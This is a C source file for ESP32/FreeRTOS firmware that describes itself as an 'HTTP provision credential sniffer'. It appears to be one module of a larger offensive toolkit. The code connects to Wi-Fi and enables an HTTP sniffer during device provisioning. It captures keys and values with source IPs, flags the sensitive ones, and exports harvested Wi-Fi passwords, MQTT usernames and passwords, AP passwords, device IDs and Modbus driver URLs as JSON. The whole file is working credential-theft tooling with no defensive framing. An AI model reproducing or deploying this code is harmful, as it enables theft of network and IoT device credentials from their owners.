/**
 * ota_provision.c - HTTP provision credential sniffer
 */

#include "ota_provision.h"
#include "ota_common.h"

#include "esp_log.h"
#include "esp_timer.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/semphr.h"

#include <string.h>
#include <stdio.h>

static const char *TAG = "ota_provision";

static ota_provision_config_t s_cfg;
static ota_provision_state_t s_state;
static volatile bool s_running = false;
static TaskHandle_t s_task = NULL;
static SemaphoreHandle_t s_exit_sem = NULL;
static esp_timer_handle_t s_timeout = NULL;
static int64_t s_start_ms = 0;

static ota_prov_cred_t s_creds[OTA_MAX_PROV_CREDS];
static int s_cred_count = 0;
static volatile uint32_t s_sensitive_count = 0;
static ota_prov_summary_t s_summary;

static void timeout_cb(void *arg)
{
    (void)arg;
    s_state.timeout = true;
    s_running = false;
}

static void on_cred_captured(void)
{
    s_state.cred_count = (uint32_t)s_cred_count;
    s_state.sensitive_count = s_sensitive_count;
    if (s_cred_count > 0)
        strncpy(s_state.state, "creds_found", sizeof(s_state.state) - 1);
}

static void reset_creds(void)
{
    s_cred_count = 0;
    s_sensitive_count = 0;
    memset(s_creds, 0, sizeof(s_creds));
    memset(&s_summary, 0, sizeof(s_summary));
}

static void task_fn(void *arg)
{
    (void)arg;
    ota_conn_params_t conn = {0};
    strncpy(conn.wifi_ssid, s_cfg.wifi_ssid, sizeof(conn.wifi_ssid) - 1);
    strncpy(conn.wifi_password, s_cfg.wifi_password, sizeof(conn.wifi_password) - 1);

    if (s_cfg.wifi_ssid[0]) {
        strncpy(s_state.state, "wifi_connecting", sizeof(s_state.state) - 1);
        if (ota_common_wifi_connect(&conn) != ESP_OK) {
            ESP_LOGW(TAG, "WiFi failed, sniff-only");
        }
    }

    ota_sniffer_opts_t opts = {
        .capture_dns = false,
        .capture_http = true,
        .provision_mode = true,
        .post_only = s_cfg.capture_post_only,
        .auto_parse_json = s_cfg.auto_parse_json,
        .sniff_port = s_cfg.sniff_port,
    };
    ota_common_sniffer_set_opts(&opts);
    ota_common_sniffer_set_provision_sink(s_creds, &s_cred_count, &s_sensitive_count,
                                          &s_summary, on_cred_captured);
    ota_common_sniffer_enable(true);
    strncpy(s_state.state, "prov_sniffing", sizeof(s_state.state) - 1);

    while (s_running) {
        s_state.cred_count = (uint32_t)s_cred_count;
        s_state.sensitive_count = s_sensitive_count;
        s_state.elapsed_sec = (uint32_t)((ota_common_now_ms() - s_start_ms) / 1000);
        if (s_cfg.timeout_sec > s_state.elapsed_sec)
            s_state.remaining_sec = s_cfg.timeout_sec - s_state.elapsed_sec;
        else
            s_state.remaining_sec = 0;
        if (s_cred_count > 0)
            strncpy(s_state.state, "creds_found", sizeof(s_state.state) - 1);
        vTaskDelay(pdMS_TO_TICKS(500));
    }

    ota_common_sniffer_enable(false);
    ota_common_wifi_restore_ap();
    if (s_timeout) esp_timer_stop(s_timeout);
    s_state.active = false;
    strncpy(s_state.state, "idle", sizeof(s_state.state) - 1);
    s_running = false;
    ota_common_release();
    if (s_exit_sem) xSemaphoreGive(s_exit_sem);
    s_task = NULL;
    vTaskDelete(NULL);
}

void ota_provision_init(void)
{
    if (!s_exit_sem) s_exit_sem = xSemaphoreCreateBinary();
    if (!s_timeout) {
        esp_timer_create_args_t a = { .callback = timeout_cb, .name = "ota_prov_to" };
        esp_timer_create(&a, &s_timeout);
    }
    memset(&s_state, 0, sizeof(s_state));
    reset_creds();
    strncpy(s_state.state, "idle", sizeof(s_state.state) - 1);
}

esp_err_t ota_provision_start(const ota_provision_config_t *cfg)
{
    if (!cfg) return ESP_ERR_INVALID_ARG;
    if (s_running) return ESP_ERR_INVALID_STATE;
    esp_err_t claim = ota_common_try_claim("provision");
    if (claim != ESP_OK) return claim;

    s_cfg = *cfg;
    if (!s_cfg.timeout_sec) s_cfg.timeout_sec = OTA_DEFAULT_TIMEOUT_SEC;
    memset(&s_state, 0, sizeof(s_state));
    reset_creds();
    strncpy(s_state.state, "starting", sizeof(s_state.state) - 1);
    s_start_ms = ota_common_now_ms();
    s_state.active = true;
    s_running = true;
    if (s_timeout) {
        esp_timer_stop(s_timeout);
        esp_timer_start_once(s_timeout, (uint64_t)s_cfg.timeout_sec * 1000000ULL);
    }
    if (xTaskCreate(task_fn, "ota_prov", OTA_TASK_STACK_SIZE, NULL,
                    OTA_TASK_PRIORITY, &s_task) != pdPASS) {
        s_running = false;
        s_state.active = false;
        ota_common_release();
        return ESP_ERR_NO_MEM;
    }
    ESP_LOGI(TAG, "Provision sniff started (port=%u post_only=%d)",
             (unsigned)s_cfg.sniff_port, (int)s_cfg.capture_post_only);
    return ESP_OK;
}

esp_err_t ota_provision_stop(void)
{
    if (!s_running) return ESP_OK;
    s_running = false;
    if (s_exit_sem &&
        xSemaphoreTake(s_exit_sem, pdMS_TO_TICKS(OTA_STOP_SEM_TIMEOUT_MS)) != pdTRUE) {
        if (s_task) { vTaskDelete(s_task); s_task = NULL; }
        ota_common_sniffer_enable(false);
        ota_common_wifi_restore_ap();
        ota_common_release();
        s_state.active = false;
    }
    if (s_timeout) esp_timer_stop(s_timeout);
    return ESP_OK;
}

bool ota_provision_is_active(void) { return s_state.active; }
const ota_provision_state_t *ota_provision_get_state(void) { return &s_state; }

cJSON *ota_provision_get_status_json(void)
{
    cJSON *o = cJSON_CreateObject();
    if (!o) return NULL;
    cJSON_AddBoolToObject(o, "active", s_state.active);
    cJSON_AddBoolToObject(o, "timeout", s_state.timeout);
    cJSON_AddNumberToObject(o, "cred_count", s_state.cred_count);
    cJSON_AddNumberToObject(o, "sensitive_count", s_state.sensitive_count);
    cJSON_AddNumberToObject(o, "elapsed_sec", s_state.elapsed_sec);
    cJSON_AddNumberToObject(o, "remaining_sec", s_state.remaining_sec);
    cJSON_AddStringToObject(o, "state", s_state.state);
    if (s_state.error[0]) cJSON_AddStringToObject(o, "error", s_state.error);
    return o;
}

const char *ota_provision_get_creds_json(void)
{
    char *buf = ota_common_json_med_b();
    if (!buf) return "[]";

    cJSON *root = cJSON_CreateArray();
    for (int i = 0; i < s_cred_count; i++) {
        cJSON *item = cJSON_CreateObject();
        cJSON_AddStringToObject(item, "key", s_creds[i].key);
        cJSON_AddStringToObject(item, "value", s_creds[i].value);
        cJSON_AddStringToObject(item, "source_ip", s_creds[i].source_ip);
        cJSON_AddBoolToObject(item, "is_sensitive", s_creds[i].is_sensitive);
        cJSON_AddNumberToObject(item, "timestamp_ms", (double)s_creds[i].timestamp_ms);
        cJSON_AddItemToArray(root, item);
    }

    char *printed = cJSON_PrintUnformatted(root);
    snprintf(buf, OTA_JSON_MED_SZ, "%s", printed ? printed : "[]");
    cJSON_Delete(root);
    free(printed);
    return buf;
}

const char *ota_provision_get_summary_json(void)
{
    char *buf = ota_common_json_2k();
    if (!buf) return "{}";

    cJSON *root = cJSON_CreateObject();
    if (s_summary.wifi_ssid[0])
        cJSON_AddStringToObject(root, "wifi_ssid", s_summary.wifi_ssid);
    if (s_summary.wifi_password[0])
        cJSON_AddStringToObject(root, "wifi_password", s_summary.wifi_password);
    if (s_summary.mqtt_broker[0])
        cJSON_AddStringToObject(root, "mqtt_broker", s_summary.mqtt_broker);
    cJSON_AddNumberToObject(root, "mqtt_port", s_summary.mqtt_port);
    if (s_summary.mqtt_username[0])
        cJSON_AddStringToObject(root, "mqtt_username", s_summary.mqtt_username);
    if (s_summary.mqtt_password[0])
        cJSON_AddStringToObject(root, "mqtt_password", s_summary.mqtt_password);
    if (s_summary.modbus_driver_url[0])
        cJSON_AddStringToObject(root, "modbus_driver_url", s_summary.modbus_driver_url);
    if (s_summary.custom_time[0])
        cJSON_AddStringToObject(root, "custom_time", s_summary.custom_time);
    if (s_summary.device_id[0])
        cJSON_AddStringToObject(root, "device_id", s_summary.device_id);
    if (s_summary.ap_password[0])
        cJSON_AddStringToObject(root, "ap_password", s_summary.ap_password);
    cJSON_AddNumberToObject(root, "total_creds_captured", s_summary.total_creds_captured);
    cJSON_AddNumberToObject(root, "sensitive_creds_captured", s_summary.sensitive_creds_captured);

    char *printed = cJSON_PrintUnformatted(root);
    snprintf(buf, OTA_JSON_2K_SZ, "%s", printed ? printed : "{}");
    cJSON_Delete(root);
    free(printed);
    return buf;
}

void ota_provision_get_summary(ota_prov_summary_t *out)
{
    if (out) *out = s_summary;
}

uint32_t ota_provision_get_cred_count(void)
{
    return (uint32_t)s_cred_count;
}

uint32_t ota_provision_get_sensitive_count(void)
{
    return s_sensitive_count;
}

void ota_provision_clear_creds(void)
{
    reset_creds();
    s_state.cred_count = 0;
    s_state.sensitive_count = 0;
}
